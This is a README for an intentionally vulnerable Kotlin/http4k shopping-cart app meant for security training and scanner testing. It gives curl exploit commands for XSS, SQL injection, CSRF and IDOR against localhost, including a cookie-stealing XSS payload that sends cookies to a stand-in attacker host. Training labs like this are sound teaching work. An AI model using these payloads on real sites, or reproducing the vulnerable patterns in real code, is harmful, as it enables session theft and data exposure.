# Vulnerable Kotlin Shopping Cart (http4k)

⚠️ **WARNING**: This application contains intentional security vulnerabilities for educational and testing purposes. **DO NOT** use this code in production environments!

## Overview

This is a deliberately vulnerable web application built with Kotlin, http4k, and jsoup. It demonstrates common web application security vulnerabilities including XSS, SQL Injection, CSRF, and IDOR.

## Features

- Shopping cart functionality with product listing
- Multiple intentional security vulnerabilities
- HTTP4K-based REST API
- Jsoup HTML parsing for cart widget extraction
- Simple, minimal codebase for easy understanding

## Requirements

- Java 17 or higher
- Gradle (wrapper included)

## Building and Running

### Build the project:
```bash
./gradlew build
```

### Run the application:
```bash
./gradlew run
```

The server will start on http://localhost:9000

### Run tests:
```bash
./gradlew test
```

## Vulnerabilities and Exploits

### 1. Reflected XSS (Cross-Site Scripting)

**Location:** `/greet` endpoint

**Description:** User input is reflected in the HTML response without any sanitization or encoding.

**Exploit with CURL:**
```bash
# Basic XSS test
curl "http://localhost:9000/greet?name=<script>alert('XSS')</script>"

# Cookie stealing XSS
curl "http://localhost:9000/greet?name=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"

# DOM manipulation
curl "http://localhost:9000/greet?name=<img src=x onerror=alert('XSS')>"
```

**Expected Result:** The malicious script tags are embedded directly in the HTML response without escaping.

---

### 2. SQL Injection

**Location:** `/search` endpoint

**Description:** Search query is concatenated into a SQL query without parameterization, executed directly against an H2 in-memory database.

**Exploit with CURL:**
```bash
# Basic SQL injection to retrieve all products
curl "http://localhost:9000/search?q=%27%20OR%20%271%27=%271"

# Alternative payload
curl "http://localhost:9000/search?q=%27%20OR%201=1%20--"
```

**Expected Result:** Returns all products instead of just matching ones, demonstrating successful SQL injection attack against a real database.

---

### 3. CSRF (Cross-Site Request Forgery)

**Location:** `/cart/add` endpoint

**Description:** State-changing operations can be performed without CSRF token validation.

**Exploit with CURL:**
```bash
# Add items to any user's cart without authentication
curl -X POST "http://localhost:9000/cart/add?user=victim&product=1"
curl -X POST "http://localhost:9000/cart/add?user=victim&product=2"

# Verify items were added
curl "http://localhost:9000/cart?user=victim"
```

**Expected Result:** Items are added to the cart without any CSRF protection.

---

### 4. IDOR (Insecure Direct Object Reference)

**Location:** `/cart` endpoint

**Description:** Any user can view any other user's cart by manipulating the user parameter.

**Exploit with CURL:**
```bash
# First, add items to different users' carts
curl -X POST "http://localhost:9000/cart/add?user=alice&product=1"
curl -X POST "http://localhost:9000/cart/add?user=bob&product=2"
curl -X POST "http://localhost:9000/cart/add?user=admin&product=3"

# Now access other users' carts without authentication
curl "http://localhost:9000/cart?user=alice"
curl "http://localhost:9000/cart?user=bob"
curl "http://localhost:9000/cart?user=admin"
```

**Expected Result:** Can view any user's cart without authentication or authorization checks.

---

## Shopping Cart Widget Client

The `DemoShoppingCartClient` class demonstrates using http4k and jsoup to fetch and parse HTML widgets:

```kotlin
val client = DemoShoppingCartClient(httpHandler)
val cartWidget = client.fetchCartWidget()
```

This fetches the `/header-widget` endpoint and extracts the cart icon HTML using CSS selector `div.cart-icon-link`.

## API Endpoints

| Method | Path | Description |
|--------|------|-------------|
| GET | `/` | Home page with product list and test links |
| GET | `/greet?name=<name>` | Vulnerable XSS endpoint |
| GET | `/search?q=<query>` | Vulnerable search with SQL injection |
| POST | `/cart/add?user=<user>&product=<id>` | Add item to cart (CSRF vulnerable) |
| GET | `/cart?user=<user>` | View cart (IDOR vulnerable) |
| GET | `/header-widget` | Cart widget HTML fragment |

## Project Structure

```
kotlin-http4k-fn/
├── build.gradle.kts                    # Gradle build configuration
├── settings.gradle.kts                 # Gradle settings
├── src/
│   ├── main/
│   │   └── kotlin/
│   │       └── com/example/demo/
│   │           ├── Main.kt             # Main application with vulnerable endpoints
│   │           └── external/cart/
│   │               └── DemoShoppingCartClient.kt  # Widget client with jsoup
│   └── test/
│       └── kotlin/
│           └── com/example/demo/
│               └── VulnerableShoppingCartAppTest.kt  # Tests
└── README.md
```

## Dependencies

- **http4k-core**: Lightweight HTTP toolkit for Kotlin
- **http4k-server-netty**: Netty server backend
- **jsoup**: HTML parser for widget extraction
- **h2**: Lightweight in-memory SQL database

## Security Notes

This application is designed for:
- Security testing and training
- Demonstrating common vulnerabilities
- Testing security scanning tools
- Educational purposes

**Do NOT:**
- Deploy to production
- Expose to the internet
- Use as a template for real applications
- Store real user data

## License

This is a demonstration project for security testing purposes.